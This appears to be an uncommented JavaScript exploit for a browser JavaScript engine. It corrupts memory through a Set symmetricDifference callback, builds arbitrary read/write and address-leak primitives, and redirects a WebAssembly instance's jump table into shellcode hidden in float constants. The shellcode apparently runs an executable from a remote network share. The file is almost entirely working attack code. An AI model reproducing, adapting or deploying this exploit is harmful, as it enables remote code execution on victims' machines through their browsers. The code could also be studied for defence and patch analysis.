let fi_buf = new ArrayBuffer(8);
let f_buf = new Float64Array(fi_buf);
let i_buf = new BigUint64Array(fi_buf);

function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

function hex(i) {
    return '0x' + i.toString(16);
}

function aar(addr) {
    elements = addr - 8n + 1n;
    fake_arr_struct[2] = itof(elements | length << 32n);
    return fake_arr[0];
}

function aaw(addr, value) {
    elements = addr - 8n + 1n;
    fake_arr_struct[2] = itof(elements | length << 32n);
    fake_arr[0] = itof(value);
}

function addrof(obj) {
    obj_arr[0] = obj;
    return ftoi(aar(obj_arr_addr)) & 0xffffffffn;
}

let receiver = new Set();
let other = new Set();

for (let i = 0; i < 32; i++) {
    receiver.add(i);
}

let fake_arr_struct;
let obj_arr;

other.keys = () => {
    fake_arr_struct = [1.1, 2.2, 3.3];
    receiver.add(32);
    obj_arr = [{}];
    return other[Symbol.iterator]();
}

let result = receiver.symmetricDifference(other);

let map = 0x10ed71n;
let properties = 0x6cdn;
let elements = 0x41414141n;
let length = 1n << 1n;

fake_arr_struct[1] = itof(map | properties << 32n);
fake_arr_struct[2] = itof(elements | length << 32n);

for (let i = 0; i < 0x10; i++) {
    result.delete(i);
}

let fake_arr = result.size;

let marker;
let leaked;

marker = 0x4141414141414141n;
fake_arr_struct[0] = itof(marker);

let fake_arr_addr = 0x4a000n;

for (let i = 0; i < 0x1000; i++) {
    leaked = ftoi(aar(fake_arr_addr));
    if (leaked == marker) break;
    fake_arr_addr += 4n;
}

fake_arr_addr += 8n;

marker = fake_arr_addr + 1n;
obj_arr[0] = fake_arr;

let obj_arr_addr = fake_arr_addr + 0x30n;

for (let i = 0; i < 0x1000; i++) {
    leaked = ftoi(aar(obj_arr_addr)) & 0xffffffffn;
    if (leaked == marker) break;
    obj_arr_addr += 4n;
}

let wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 222, 1, 1, 219, 1, 0, 68, 72, 49, 201, 144, 144, 144, 235, 7, 68, 101, 72, 139, 113, 96, 144, 235, 7, 68, 72, 139, 118, 24, 144, 144, 235, 7, 68, 72, 139, 118, 32, 144, 144, 235, 7, 68, 72, 139, 54, 72, 173, 144, 235, 7, 68, 72, 139, 88, 32, 144, 144, 235, 7, 68, 185, 128, 18, 0, 0, 144, 235, 7, 68, 72, 1, 203, 144, 144, 144, 235, 12, 68, 104, 46, 101, 120, 101, 144, 235, 12, 68, 72, 49, 192, 144, 144, 144, 235, 12, 68, 184, 97, 114, 101, 100, 144, 235, 12, 68, 72, 193, 224, 32, 144, 144, 235, 12, 68, 72, 13, 114, 92, 115, 104, 235, 12, 68, 80, 144, 144, 144, 144, 144, 235, 12, 68, 184, 92, 117, 115, 101, 144, 235, 12, 68, 144, 72, 193, 224, 32, 144, 235, 12, 68, 72, 13, 46, 49, 48, 48, 235, 12, 68, 144, 80, 144, 144, 144, 144, 235, 12, 68, 184, 46, 56, 46, 48, 144, 235, 12, 68, 144, 144, 72, 193, 224, 32, 235, 15, 68, 72, 13, 92, 92, 49, 48, 235, 15, 68, 144, 144, 80, 144, 144, 144, 235, 15, 68, 72, 137, 225, 106, 5, 90, 235, 15, 68, 72, 131, 236, 48, 255, 211, 0, 0, 15, 11]);
let wasmModule = new WebAssembly.Module(wasmCode);
let wasmInstance = new WebAssembly.Instance(wasmModule);
let main = wasmInstance.exports.main;

let wasmInstance_addr = addrof(wasmInstance);
let jump_table_start = ftoi(aar(wasmInstance_addr + 0x47n));
aaw(wasmInstance_addr + 0x47n, jump_table_start + 0x81an);

main();
